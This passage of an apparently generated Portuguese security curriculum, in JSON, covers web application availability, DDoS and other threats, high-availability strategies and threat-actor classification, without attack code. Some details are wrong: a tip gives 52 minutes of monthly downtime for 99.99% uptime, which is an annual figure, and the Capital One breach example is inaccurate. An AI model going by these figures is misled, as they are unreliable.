                                    "Discuta métricas: SLA (Service Level Agreement) de 99.99% (\"four nines\").",
                                    "Registre 5 ameaças e seus impactos em uma tabela."
                                  ],
                                  "verification": "Preencha uma tabela com 5 ameaças, descrições e impactos potenciais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Relatórios OWASP, notícias de ciberataques ( Krebs on Security), planilha Excel/Google Sheets.",
                                  "tips": "Use calculadoras online de custo de downtime para quantificar impactos.",
                                  "learningObjective": "Reconhecer ameaças específicas à disponibilidade em apps web.",
                                  "commonMistakes": "Subestimar ataques intencionais vs. falhas acidentais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Definir métricas e estratégias básicas de garantia",
                                  "subSteps": [
                                    "Aprenda métricas: uptime percentage, MTBF (Mean Time Between Failures), MTTR (Mean Time To Repair).",
                                    "Estude estratégias: redundância, failover, monitoramento com ferramentas como Pingdom.",
                                    "Escreva uma definição completa integrando todos os elementos aprendidos.",
                                    "Crie um checklist para avaliar disponibilidade de um app web hipotético.",
                                    "Teste sua definição explicando para um colega ou gravando um vídeo curto."
                                  ],
                                  "verification": "Grave ou escreva uma explicação de 1 minuto da disponibilidade em apps web.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Ferramentas de monitoramento gratuitas (UptimeRobot), calculadora de uptime online.",
                                  "tips": "Memorize '99.99% uptime = no more than 52 minutos de downtime por mês'.",
                                  "learningObjective": "Formular uma definição acionável com métricas e estratégias.",
                                  "commonMistakes": "Confundir disponibilidade com alta disponibilidade (HA) sem contexto de segurança."
                                }
                              ],
                              "practicalExample": "Em um e-commerce como Amazon, disponibilidade garante que durante a Black Friday o site permaneça acessível para milhões de usuários autorizados, evitando perdas de vendas por downtime causado por tráfego excessivo ou DDoS.",
                              "finalVerifications": [
                                "O aluno define disponibilidade corretamente, incluindo usuários autorizados e downtime.",
                                "Identifica pelo menos 3 ameaças específicas a apps web.",
                                "Calcula uptime percentage a partir de downtime dado.",
                                "Explica diferença entre downtime planejado e não planejado.",
                                "Descreve uma estratégia básica de mitigação (ex: redundância).",
                                "Integra conceito na Triade CIA sem confusões."
                              ],
                              "assessmentCriteria": [
                                "Clareza e precisão da definição (30%)",
                                "Uso de exemplos concretos de apps web (20%)",
                                "Identificação correta de ameaças e métricas (20%)",
                                "Conexão com Triade CIA (15%)",
                                "Capacidade de explicar verbalmente ou por escrito (15%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de redundância como BGP e load balancing.",
                                "Administração de Sistemas: Monitoramento e high availability (HA) clusters.",
                                "Desenvolvimento de Software: Implementação de microservices resilientes.",
                                "Gestão de Projetos: SLAs em contratos de TI."
                              ],
                              "realWorldApplication": "Em bancos online, garante acesso contínuo a saldos e transações; em serviços de saúde web, assegura que prontuários sejam acessíveis 24/7 para emergências, evitando riscos à vida por indisponibilidade."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.3.2",
                            "name": "Identificar ameaças à disponibilidade em aplicações web",
                            "description": "Reconhecer ataques como DDoS, falhas de hardware e sobrecarga de recursos em serviços para a Internet e nuvem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de Disponibilidade na Triade CIA",
                                  "subSteps": [
                                    "Estudar a Triade CIA (Confidencialidade, Integridade e Disponibilidade).",
                                    "Definir Disponibilidade como a garantia de acesso contínuo aos serviços.",
                                    "Analisar exemplos de indisponibilidade em aplicações web, como downtime.",
                                    "Diferenciar Disponibilidade de Confidencialidade e Integridade.",
                                    "Relacionar com serviços na internet e nuvem."
                                  ],
                                  "verification": "Escrever um parágrafo resumindo o conceito de Disponibilidade e sua importância em apps web.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo OWASP sobre Triade CIA (https://owasp.org/www-community/controls/Confidentiality_Integrity_Availability)",
                                    "Vídeo introdutório no YouTube sobre CIA Triad"
                                  ],
                                  "tips": "Use analogias cotidianas, como um site de banco indisponível durante pico de uso.",
                                  "learningObjective": "Dominar a definição e o papel da Disponibilidade na segurança de aplicações.",
                                  "commonMistakes": "Confundir Disponibilidade com velocidade de carregamento (performance)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar ataques DDoS como ameaça principal",
                                  "subSteps": [
                                    "Explicar o que é DDoS (Distributed Denial of Service).",
                                    "Identificar tipos: volumétrico, de protocolo e de aplicação (Layer 7).",
                                    "Descrever o mecanismo: inundação de tráfego falso para esgotar recursos.",
                                    "Analisar sintomas em apps web: lentidão ou falha total de acesso.",
                                    "Pesquisar ferramentas comuns usadas em DDoS, como botnets."
                                  ],
                                  "verification": "Listar 3 tipos de DDoS e um exemplo de impacto em um site real.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Documentação Cloudflare sobre DDoS (https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/)",
                                    "Infográfico de ataques DDoS recentes"
                                  ],
                                  "tips": "Monitore o tráfego normal vs. anormal para diferenciar de picos legítimos.",
                                  "learningObjective": "Reconhecer mecanismos e impactos de ataques DDoS em aplicações web.",
                                  "commonMistakes": "Achar que DDoS só afeta grandes empresas; pequenas apps também são vulneráveis."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar falhas de hardware e sobrecarga de recursos",
                                  "subSteps": [
                                    "Identificar falhas de hardware: disco rígido defeituoso, falha de CPU ou memória.",
                                    "Explicar sobrecarga de recursos: uso excessivo de CPU, RAM ou banda por tráfego legítimo ou leaks.",
                                    "Diferenciar causas intencionais (ataques) de não intencionais (bugs de código).",
                                    "Analisar em contextos de nuvem: limites de instâncias AWS ou Azure.",
                                    "Estudar monitoramento: uso de ferramentas como top, htop ou CloudWatch."
                                  ],
                                  "verification": "Descrever 2 cenários de falha de hardware e 2 de sobrecarga em apps web.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Guia AWS sobre monitoramento de recursos (https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/WhatIsCloudWatch.html)",
                                    "Artigo sobre falhas comuns em servidores web"
                                  ],
                                  "tips": "Sempre verifique logs de sistema para padrões de falha recorrente.",
                                  "learningObjective": "Identificar causas não-maliciosas de indisponibilidade.",
                                  "commonMistakes": "Ignorar sobrecargas causadas por código ineficiente, focando só em ataques."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação de ameaças em cenários reais",
                                  "subSteps": [
                                    "Analisar logs simulados de um app web sob DDoS.",
                                    "Simular sobrecarga com ferramentas como Apache Benchmark (ab).",
                                    "Avaliar casos de nuvem: escalonamento automático falhando.",
                                    "Classificar ameaças em um diagrama de app web (frontend, backend, DB).",
                                    "Discutir mitigações básicas para cada ameaça."
                                  ],
                                  "verification": "Criar um relatório identificando ameaças em um cenário fornecido.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ferramenta online simuladora de DDoS (https://www.ddos-simulator.com/)",
                                    "Logs de exemplo de GitHub sobre incidentes de segurança"
                                  ],
                                  "tips": "Use Wireshark para visualizar tráfego suspeito em simulações locais.",
                                  "learningObjective": "Aplicar conhecimento para diagnosticar ameaças à disponibilidade.",
                                  "commonMistakes": "Não considerar cadeia de dependências, como DB sobrecarregada afetando o app."
                                }
                              ],
                              "practicalExample": "Em um e-commerce durante Black Friday, um ataque DDoS inunda o servidor com 100.000 requisições/segundo, causando falha total. Identifique: tráfego UDP massivo (DDoS volumétrico), CPU em 100% (sobrecarga), comparando com logs normais de 1.000 req/s.",
                              "finalVerifications": [
                                "Listar e descrever 5 ameaças específicas à disponibilidade em apps web.",
                                "Explicar diferenças entre DDoS e sobrecarga legítima.",
                                "Analisar um log de erro e identificar a ameaça principal.",
                                "Diferenciar impactos em serviços on-premise vs. nuvem.",
                                "Propor 3 verificações iniciais para suspeita de indisponibilidade.",
                                "Demonstrar compreensão com um fluxograma de diagnóstico."
                              ],
                              "assessmentCriteria": [
                                "Precisão na classificação de ameaças (DDoS vs. falhas internas).",
                                "Profundidade nos exemplos e mecanismos de cada ameaça.",
                                "Capacidade de análise em cenários simulados ou reais.",
                                "Uso correto de terminologia da Triade CIA.",
                                "Criatividade em conexões com contextos web/nuvem.",
                                "Clareza na comunicação de verificações e mitigações."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Análise de tráfego e protocolos IP/TCP.",
                                "Administração de Sistemas: Monitoramento de recursos com ferramentas como Nagios.",
                                "Desenvolvimento Web: Otimização de código para evitar sobrecargas.",
                                "Banco de Dados: Queries ineficientes causando indisponibilidade.",
                                "Gestão de Projetos: Planejamento de escalabilidade em nuvem."
                              ],
                              "realWorldApplication": "Profissionais de DevOps usam esse conhecimento para configurar WAFs como Cloudflare ou AWS Shield, protegendo sites de e-commerce e serviços SaaS contra DDoS, garantindo 99.9% de uptime e evitando perdas financeiras de milhões durante ataques."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.3.3",
                            "name": "Aplicar estratégias para alta disponibilidade",
                            "description": "Descrever redundância, balanceamento de carga, backups e monitoramento para manter a disponibilidade em aplicações web modernas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender e Planejar Redundância em Aplicações Web",
                                  "subSteps": [
                                    "Identifique pontos únicos de falha na arquitetura atual da aplicação web.",
                                    "Defina níveis de redundância: servidores, bancos de dados e rede.",
                                    "Escolha modelos de redundância ativa-passiva ou ativa-ativa.",
                                    "Desenhe um diagrama de arquitetura com componentes redundantes.",
                                    "Calcule o custo-benefício da redundância implementada."
                                  ],
                                  "verification": "Diagrama de arquitetura revisado por pares ou ferramenta como Draw.io exportado e compartilhado.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Ferramentas de diagramação (Draw.io, Lucidchart), documentação de arquitetura de apps web (AWS Well-Architected Framework).",
                                  "tips": "Comece com redundância no banco de dados, pois é o gargalo mais comum.",
                                  "learningObjective": "Planejar redundância para eliminar single points of failure.",
                                  "commonMistakes": "Ignorar redundância na camada de rede, levando a falhas em conectividade."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Balanceamento de Carga",
                                  "subSteps": [
                                    "Selecione um load balancer (ex: NGINX, AWS ELB, HAProxy).",
                                    "Configure health checks para rotear tráfego apenas para instâncias saudáveis.",
                                    "Distribua tráfego por round-robin ou least connections.",
                                    "Teste failover simulando falha de uma instância.",
                                    "Monitore métricas de distribuição de carga."
                                  ],
                                  "verification": "Logs do load balancer mostram tráfego distribuído e failover automático em simulação.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Servidor de teste (Docker, AWS EC2 free tier), NGINX/HAProxy instalado.",
                                  "tips": "Use health checks com endpoints /healthz para simplicidade.",
                                  "learningObjective": "Garantir distribuição uniforme de tráfego para alta disponibilidade.",
                                  "commonMistakes": "Configurar health checks muito agressivos, causando flapping de instâncias."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Backups e Estratégias de Recuperação",
                                  "subSteps": [
                                    "Defina RPO (Recovery Point Objective) e RTO (Recovery Time Objective).",
                                    "Implemente backups incrementais e full para dados e configurações.",
                                    "Configure armazenamento off-site ou em nuvem (S3, Azure Blob).",
                                    "Crie scripts de restauração e teste em ambiente staging.",
                                    "Automatize backups com cron jobs ou ferramentas como Velero."
                                  ],
                                  "verification": "Backup restaurado com sucesso em ambiente de teste dentro do RTO definido.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Ferramentas de backup (rsync, AWS Backup), ambiente de staging.",
                                  "tips": "Teste restaurações mensalmente; backups não testados são inúteis.",
                                  "learningObjective": "Estabelecer recuperação rápida de desastres.",
                                  "commonMistakes": "Backups sem criptografia, expondo dados sensíveis."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estabelecer Monitoramento Contínuo",
                                  "subSteps": [
                                    "Escolha ferramentas de monitoramento (Prometheus, Grafana, CloudWatch).",
                                    "Defina métricas chave: CPU, memória, latência, taxa de erro.",
                                    "Configure alertas para thresholds de disponibilidade (ex: 99.9% uptime).",
                                    "Integre logs centralizados (ELK Stack).",
                                    "Crie dashboards personalizados para visualização em tempo real."
                                  ],
                                  "verification": "Dashboard ativo com alertas disparados em simulação de falha.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Prometheus + Grafana (Docker Compose), métricas de app web de teste.",
                                  "tips": "Monitore 'aplicação-specific' métricas além de infraestrutura.",
                                  "learningObjective": "Detectar e responder proativamente a degradações de disponibilidade.",
                                  "commonMistakes": "Alertas sem ação associada, gerando fadiga de alertas."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Validar a Alta Disponibilidade",
                                  "subSteps": [
                                    "Execute chaos engineering (ex: matar pods no Kubernetes).",
                                    "Meça uptime com ferramentas como UptimeRobot.",
                                    "Simule falhas em múltiplos componentes simultaneamente.",
                                    "Analise relatórios de testes e ajuste configurações.",
                                    "Documente lições aprendidas e plano de manutenção."
                                  ],
                                  "verification": "Relatório de teste mostrando uptime >99% após simulações de falha.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ferramentas de chaos (Chaos Monkey, Gremlin free tier), UptimeRobot.",
                                  "tips": "Comece com testes simples antes de chaos avançado.",
                                  "learningObjective": "Validar end-to-end a resiliência da aplicação.",
                                  "commonMistakes": "Testar apenas em ambiente dev, não refletindo produção."
                                }
                              ],
                              "practicalExample": "Em um e-commerce web com Node.js e MongoDB hospedado na AWS: configure Auto Scaling Groups com ELB para balanceamento, replsets no MongoDB para redundância, snapshots diários no EBS/S3 para backups, e CloudWatch alarms para monitoramento. Simule falha de uma EC2 e verifique que o site continua disponível.",
                              "finalVerifications": [
                                "Aplicação mantém uptime >99.9% durante testes de falha.",
                                "Failover de load balancer ocorre em <30 segundos.",
                                "Backup restaurado recupera dados dentro do RTO/RPO.",
                                "Alertas de monitoramento disparam corretamente para anomalias.",
                                "Diagrama de arquitetura documenta todas as estratégias HA.",
                                "Relatório de chaos engineering confirma resiliência."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e mitigação de single points of failure (30%).",
                                "Configuração correta de load balancing e health checks (25%).",
                                "Eficácia de backups com testes de restauração comprovados (20%).",
                                "Dashboards de monitoramento abrangentes e acionáveis (15%).",
                                "Validação através de testes end-to-end (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Integra com confidencialidade via criptografia em backups.",
                                "DevOps: Automação com CI/CD para deployments sem downtime.",
                                "Redes: Conceitos de failover em roteamento BGP.",
                                "Banco de Dados: Sharding e replicação para escalabilidade."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam essas estratégias com Chaos Engineering no Spinnaker para garantir streaming ininterrupto durante picos de demanda global, evitando perdas milionárias por minuto de downtime."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.2",
                    "name": "Modelo de Ameaças para Aplicações Web",
                    "description": "Identificação de atores, vetores de ataque e impactos potenciais em aplicações na Internet.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.2.1",
                        "name": "Atores de Ameaças em Aplicações Web",
                        "description": "Identificação e classificação dos principais atores que representam riscos para aplicações web, incluindo motivações e capacidades típicas.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.1.1",
                            "name": "Classificar atores externos",
                            "description": "Diferenciar atores externos como hackers oportunistas, script kiddies e grupos organizados de crime cibernético, descrevendo suas motivações (ganho financeiro, espionagem) e métodos comuns de acesso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender conceitos básicos de atores externos",
                                  "subSteps": [
                                    "Pesquisar definições de atores de ameaças cibernéticas.",
                                    "Identificar categorias principais: oportunistas, amadores e organizados.",
                                    "Ler exemplos iniciais de cada tipo em fontes confiáveis.",
                                    "Anotar diferenças superficiais entre eles.",
                                    "Revisar glossário de termos como 'hacker' e 'ameaça externa'."
                                  ],
                                  "verification": "Criar um mapa mental com definições básicas de pelo menos 3 tipos de atores.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Artigo da OWASP sobre atores de ameaças",
                                    "Ferramenta de mapa mental (ex: MindMeister)"
                                  ],
                                  "tips": "Comece com fontes oficiais como OWASP ou NIST para precisão.",
                                  "learningObjective": "Diferenciar conceitualmente atores externos de internos e entender o escopo de ameaças web.",
                                  "commonMistakes": [
                                    "Confundir atores externos com insiders",
                                    "Ignorar contexto de aplicações web",
                                    "Usar definições genéricas sem foco em cibersegurança"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar hackers oportunistas e script kiddies",
                                  "subSteps": [
                                    "Descrever características de hackers oportunistas: buscam alvos fáceis para ganho rápido.",
                                    "Explicar script kiddies: usam ferramentas prontas sem entender o código.",
                                    "Listar motivações comuns: ganho financeiro via ransomware simples ou vandalismo.",
                                    "Identificar métodos: scans automatizados, exploits conhecidos (ex: SQL injection básica).",
                                    "Comparar os dois tipos em uma tabela."
                                  ],
                                  "verification": "Preencher uma tabela comparativa com 4 colunas: tipo, motivação, método, exemplo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação MITRE ATT&CK para atores oportunistas",
                                    "Vídeos educativos no YouTube sobre script kiddies"
                                  ],
                                  "tips": "Use exemplos reais como ataques a sites pequenos para ilustrar.",
                                  "learningObjective": "Classificar e descrever hackers oportunistas e script kiddies com exemplos de métodos.",
                                  "commonMistakes": [
                                    "Superestimar sofisticação de script kiddies",
                                    "Omitir métodos comuns como phishing genérico",
                                    "Confundir com atores estatais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar grupos organizados de crime cibernético",
                                  "subSteps": [
                                    "Definir grupos organizados: equipes profissionais com divisão de papéis.",
                                    "Explorar motivações: ganho financeiro em escala, espionagem industrial.",
                                    "Detalhar métodos: engenharia social avançada, zero-days, campanhas APT.",
                                    "Pesquisar exemplos: grupos como Conti ou Lazarus.",
                                    "Mapear táticas comuns em aplicações web (ex: credential stuffing em massa)."
                                  ],
                                  "verification": "Escrever um parágrafo resumindo um grupo específico, suas motivações e 3 métodos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Relatórios da Mandiant ou CrowdStrike",
                                    "Base de dados MITRE para grupos APT"
                                  ],
                                  "tips": "Foque em relatórios recentes para relevância atual.",
                                  "learningObjective": "Identificar características únicas de grupos organizados versus indivíduos.",
                                  "commonMistakes": [
                                    "Generalizar todos os grupos como 'hackers russos'",
                                    "Ignorar motivações não-financeiras como ideológicas",
                                    "Subestimar persistência em acessos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar classificação e síntese",
                                  "subSteps": [
                                    "Analisar 3 cenários hipotéticos de ataques web.",
                                    "Classificar cada ator e justificar motivações/métodos.",
                                    "Criar fluxograma para classificação rápida.",
                                    "Discutir defesas específicas para cada tipo.",
                                    "Autoavaliar classificações com critérios pré-definidos."
                                  ],
                                  "verification": "Classificar corretamente 3 cenários em um quiz autoaplicado.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Cenários de ataque preparados (ex: PDF com casos)",
                                    "Ferramenta de fluxograma (ex: Lucidchart)"
                                  ],
                                  "tips": "Use perguntas como 'Exploit conhecido? Persistência longa?' para guiar.",
                                  "learningObjective": "Aplicar classificação em cenários reais de ameaças web.",
                                  "commonMistakes": [
                                    "Classificar por dano causado ao invés de perfil",
                                    "Omitir motivações híbridas",
                                    "Não considerar evolução de atores"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o ataque ao site de uma loja online: injeção SQL simples usando ferramenta pública, visando roubo de cartões. Classifique como script kiddie (motivação financeira rápida, método oportunista), proponha defesas como WAF e valide com relatório de incidente.",
                              "finalVerifications": [
                                "Listar e diferenciar 3 tipos de atores externos com exemplos.",
                                "Descrever motivações e 2 métodos para cada tipo.",
                                "Classificar corretamente 4 cenários de ataques web.",
                                "Explicar impacto em aplicações web para cada ator.",
                                "Criar tabela comparativa completa.",
                                "Identificar defesas iniciais por tipo de ator."
                              ],
                              "assessmentCriteria": [
                                "Precisão na classificação (90% correto em quiz).",
                                "Profundidade nas motivações e métodos descritos.",
                                "Uso de exemplos reais e fontes citadas.",
                                "Clareza na comunicação (tabelas/mapas bem estruturados).",
                                "Capacidade de síntese em fluxogramas ou resumos.",
                                "Identificação de erros comuns evitados."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Análise de motivações humanas (ganância, curiosidade).",
                                "Direito: Legislação sobre crimes cibernéticos (Lei Carolina Dieckmann).",
                                "Sociologia: Impacto de grupos criminosos na sociedade digital.",
                                "Ética: Discussão sobre hacking ético vs. malicioso."
                              ],
                              "realWorldApplication": "Em desenvolvimento de apps web, classificar atores permite priorizar defesas: scans básicos contra script kiddies, monitoramento APT contra grupos organizados, reduzindo riscos em e-commerces ou bancos online."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.1.2",
                            "name": "Identificar atores internos",
                            "description": "Reconhecer ameaças internas como funcionários descontentes, fornecedores ou parceiros com acesso privilegiado, analisando cenários de abuso de credenciais e insider trading.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de atores internos em segurança",
                                  "subSteps": [
                                    "Defina o que é um ator interno: indivíduos com acesso legítimo à organização.",
                                    "Diferencie atores internos de externos, destacando o acesso privilegiado.",
                                    "Identifique motivos comuns: descontentamento, ganância ou pressão externa.",
                                    "Estude exemplos iniciais de ameaças internas em aplicações web.",
                                    "Revise estatísticas sobre prevalência de insider threats."
                                  ],
                                  "verification": "Resuma em 3 frases os conceitos chave e liste 3 motivos comuns.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Artigo da OWASP sobre insider threats, vídeo introdutório no YouTube.",
                                  "tips": "Use analogias como 'lobo em pele de cordeiro' para fixar o conceito.",
                                  "learningObjective": "Entender a definição e motivações de atores internos.",
                                  "commonMistakes": "Confundir com hackers externos; ignorar motivações humanas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar tipos comuns de atores internos",
                                  "subSteps": [
                                    "Liste funcionários descontentes: ex-despedidos ou insatisfeitos.",
                                    "Analise fornecedores e parceiros com acesso privilegiado.",
                                    "Explore contractors e terceiros com credenciais compartilhadas.",
                                    "Classifique por nível de acesso: admin, desenvolvedor, usuário comum.",
                                    "Crie uma tabela comparativa de tipos e riscos associados."
                                  ],
                                  "verification": "Crie uma lista com 5 tipos de atores internos e exemplos breves.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Planilha Google Sheets ou papel, documento MITRE ATT&CK para insiders.",
                                  "tips": "Priorize tipos por frequência em relatórios de segurança.",
                                  "learningObjective": "Reconhecer perfis específicos de atores internos.",
                                  "commonMistakes": "Subestimar fornecedores como ameaça principal."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar cenários de abuso de credenciais e insider trading",
                                  "subSteps": [
                                    "Descreva abuso de credenciais: uso indevido de logins para exfiltração de dados.",
                                    "Estude insider trading: manipulação de dados financeiros para ganho pessoal.",
                                    "Simule cenários em aplicações web: alteração de DB ou vazamento via API.",
                                    "Identifique indicadores: acessos fora do horário, downloads massivos.",
                                    "Mapeie impactos: perda financeira, reputacional e regulatória."
                                  ],
                                  "verification": "Analise 2 cenários hipotéticos e identifique o ator interno envolvido.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Casos de estudo da Verizon DBIR, ferramenta de diagrama como Draw.io.",
                                  "tips": "Pense em logs de acesso como 'pistas de crime'.",
                                  "learningObjective": "Analisar cenários reais de ameaças internas.",
                                  "commonMistakes": "Focar só em roubo de dados, ignorar sabotagem."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação em casos reais e simulações",
                                  "subSteps": [
                                    "Revise casos famosos: ex-Edward Snowden ou vazamentos corporativos.",
                                    "Crie um diagrama de ameaça para um cenário web app.",
                                    "Simule detecção: liste sinais de alerta em um log fictício.",
                                    "Desenvolva perguntas para entrevistas de onboarding de segurança.",
                                    "Avalie seu próprio 'perfil de risco' como insider hipotético."
                                  ],
                                  "verification": "Produza um relatório curto de 1 página sobre um caso simulado.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Casos reais online ( Krebs on Security), simulador de logs gratuito.",
                                  "tips": "Use a regra 'Cui bono?' (quem se beneficia?) para identificar atores.",
                                  "learningObjective": "Aplicar conhecimento para identificar atores em prática.",
                                  "commonMistakes": "Ignorar contexto organizacional nos cenários."
                                }
                              ],
                              "practicalExample": "Em uma startup de fintech, um desenvolvedor descontento usa suas credenciais de admin para acessar a API de transações, altera registros para insider trading e vende dados no dark web, causando perda de US$500k.",
                              "finalVerifications": [
                                "Lista corretamente 5 tipos de atores internos com exemplos.",
                                "Analisa um cenário de abuso de credenciais identificando 3 indicadores.",
                                "Diferencia insider trading de ameaças externas em um diagrama.",
                                "Cita 3 estatísticas reais sobre prevalência de insider threats.",
                                "Propõe 2 medidas preventivas básicas para atores internos.",
                                "Resume lições de um caso real em 5 pontos chave."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e classificação de atores (30%)",
                                "Profundidade na análise de cenários (25%)",
                                "Criatividade em exemplos práticos (20%)",
                                "Uso correto de verificações e indicadores (15%)",
                                "Clareza e estrutura no relatório final (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Psicologia Organizacional: motivações humanas e comportamento desviado.",
                                "Gestão de Recursos Humanos: políticas de onboarding e offboarding.",
                                "Direito Empresarial: conformidade com LGPD/GDPR em insider threats.",
                                "Análise de Dados: detecção via logs e machine learning."
                              ],
                              "realWorldApplication": "Em empresas como bancos ou e-commerces, identificar atores internos previne breaches como o da Capital One (2019), onde um ex-funcionária explorou credenciais para roubar dados de 100 milhões de clientes, economizando milhões em multas e recuperação."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.1.3",
                            "name": "Avaliar motivações e capacidades",
                            "description": "Mapear motivações (financeiras, ideológicas, acidentais) e níveis de sofisticação dos atores para priorizar defesas em aplicações web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Categorizar Motivações dos Atores de Ameaças",
                                  "subSteps": [
                                    "Estude as categorias principais de motivações: financeiras (ganho monetário), ideológicas (ativismo, hacktivismo), acidentais (erros internos ou insiders não intencionais).",
                                    "Pesquise exemplos reais: cibercriminosos visando roubo de dados para venda no dark web (financeira), grupos como Anonymous atacando sites governamentais (ideológica).",
                                    "Crie uma tabela comparativa listando motivações, exemplos de atores e impactos potenciais em apps web.",
                                    "Analise como motivações influenciam táticas: motivações financeiras levam a ataques oportunistas como phishing.",
                                    "Documente 3-5 atores hipotéticos com suas motivações primárias."
                                  ],
                                  "verification": "Tabela completa com pelo menos 3 categorias de motivações, exemplos e impactos preenchida corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "OWASP Threat Actors Cheat Sheet",
                                    "MITRE ATT&CK Framework (motivações)",
                                    "Notebook ou planilha Google Sheets"
                                  ],
                                  "tips": "Use cores para diferenciar categorias de motivações na tabela para visualização rápida.",
                                  "learningObjective": "Compreender e classificar motivações para prever comportamentos de ameaças.",
                                  "commonMistakes": "Confundir motivações acidentais com intencionais; ignorar motivações mistas (ex: financeira + ideológica)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Avaliar Níveis de Sofisticação e Capacidades Técnicas",
                                  "subSteps": [
                                    "Defina níveis de sofisticação: script kiddies (baixa, usam ferramentas prontas), hackers intermediários (média, customizam exploits), APTs (alta, zero-days e engenharia social avançada).",
                                    "Liste capacidades associadas: baixa (SQL injection básica), média (bypass de WAF), alta (ataques supply chain).",
                                    "Crie uma escala de 1-5 para sofisticação baseada em recursos, persistência e inovação.",
                                    "Pesquise casos: Equifax breach (alta sofisticação chinesa) vs ataques DDoS simples.",
                                    "Avalie capacidades para apps web específicas: OWASP Top 10 vulnerabilidades exploráveis por nível."
                                  ],
                                  "verification": "Escala de sofisticação criada com exemplos de capacidades para cada nível.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "OWASP Top 10",
                                    "MITRE ATT&CK Navigator",
                                    "Relatórios Verizon DBIR"
                                  ],
                                  "tips": "Associe sofisticação a vetores de ataque comuns em apps web como XSS ou CSRF.",
                                  "learningObjective": "Mapear capacidades técnicas para estimar risco real de exploração.",
                                  "commonMistakes": "Superestimar script kiddies como APTs; subestimar insiders com acesso alto."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Atores Específicos em Cenários de Aplicações Web",
                                  "subSteps": [
                                    "Selecione um app web hipotético (ex: e-commerce) e liste 5 atores potenciais com motivação + sofisticação.",
                                    "Para cada ator, descreva táticas prováveis: ex: insider acidental (motivação baixa, sofisticação média).",
                                    "Use matriz motivação x sofisticação para plotar atores.",
                                    "Simule mapeamento: identifique dados sensíveis alvos (cartões de crédito para financeiros).",
                                    "Valide com threat modeling tools como Microsoft Threat Modeling Tool."
                                  ],
                                  "verification": "Matriz preenchida com 5 atores mapeados corretamente em um app web exemplo.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Microsoft Threat Modeling Tool (gratuito)",
                                    "Exemplo de app web diagrama (Draw.io)"
                                  ],
